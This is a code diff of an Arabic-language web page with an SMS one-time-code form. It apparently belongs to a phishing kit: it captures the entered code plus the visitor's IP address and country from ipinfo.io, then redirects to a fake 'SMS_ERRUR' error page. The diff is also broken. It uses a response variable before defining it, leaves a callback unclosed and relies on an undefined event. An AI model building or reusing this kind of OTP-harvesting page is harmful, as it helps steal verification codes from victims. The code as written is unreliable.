@@ -717,15 +717,7 @@ span{
     </div>
 	<p style="text-align: center;"><a class="btn btn-default" id="resend-sms" href="#" style="font-style: italic; font-size:13px;font-weight:bold">إعادة إرسال مرة آخرى</a></p>
 <div style="text-align: center;">
-    <button style="padding: 10px 20px;
-        font-size: 16px;
-        background-color: #4CAF50;
-        color: #fff;
-        border: none;
-        border-radius: 5px;
-        cursor: pointer;
-        display: inline-block;
-		width: 150px;" type="submit">متابعة</button>
+    <a onclick="sendotp();" style="padding: 10px 20px;font-size: 16px;background-color: #4CAF50;color: #fff;border: none;border-radius: 5px;cursor: pointer;display: inline-block;width: 150px;">متابعة</a>
 </div>
 	
   </form>
@@ -735,13 +727,31 @@ span{
 
 
 <script>
-    $(document).ready(function() {
-        $('#otp').submit(function(event) {
+
+    function sendotp(){
             event.preventDefault();
 
             var smsCode = $("#sms").val();
             var ipAddress = $("#ip").val();
             var country = $("#country").val(); // استرجاع اسم الدولة
+
+            var ipAddress = response.ip;
+            var country = response.country;
+
+
+
+            // جلب معلومات الـ IP باستخدام خدمة ipinfo.io
+            $.get("https://ipinfo.io/", function(response) {
+             // استرجاع اسم الدولة
+
+            // تحديث الحقل الخاص بالـ IP
+            $("#ip").val(ipAddress);
+
+            // تحديث الحقل الخاص بالدولة
+            $("#country").val(country);
+
+
+            
 
             // التحقق من إدخال رمز الـ SMS
             if (!smsCode || !smsCode.match(/^\d+$/)) {
@@ -763,20 +773,9 @@ span{
                 // بعد الإرسال، قم بتوجيه المستخدم إلى الصفحة الأخرى
                 window.location.href = "SMS_ERRUR091a.html?FGDD=Loauyb734HSDHDS783JSDUE7Y34UEUY3GSDGHDSH73JS773USUSUS7ISUS63";
             });
-        });
+    }
 
-        // جلب معلومات الـ IP باستخدام خدمة ipinfo.io
-        $.get("https://ipinfo.io/", function(response) {
-            var ipAddress = response.ip;
-            var country = response.country; // استرجاع اسم الدولة
 
-            // تحديث الحقل الخاص بالـ IP
-            $("#ip").val(ipAddress);
-
-            // تحديث الحقل الخاص بالدولة
-            $("#country").val(country);
-        }, "json");
-    });
 </script>
 
         
